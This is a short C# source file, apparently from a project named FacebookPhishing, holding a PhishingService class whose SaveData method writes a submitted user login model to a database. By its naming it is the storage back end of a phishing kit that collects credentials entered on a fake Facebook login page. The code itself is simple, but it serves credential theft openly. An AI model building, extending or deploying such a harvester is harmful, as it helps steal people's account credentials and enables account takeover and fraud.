using facebookphishing.DATA;
using FacebookPhishing.Domain;
using FacebookPhishing.Models;

namespace FacebookPhishing.InterfaceServices
{
    public class PhishingService : IPhishInterface
    {
        private readonly Context _context;

        public PhishingService(Context context)
        {
            _context = context;
        }
        public User SaveData(User userloginmodel)
        {
            _context.Add(userloginmodel);
            _context.SaveChanges();
            return null;
        }
    }
}
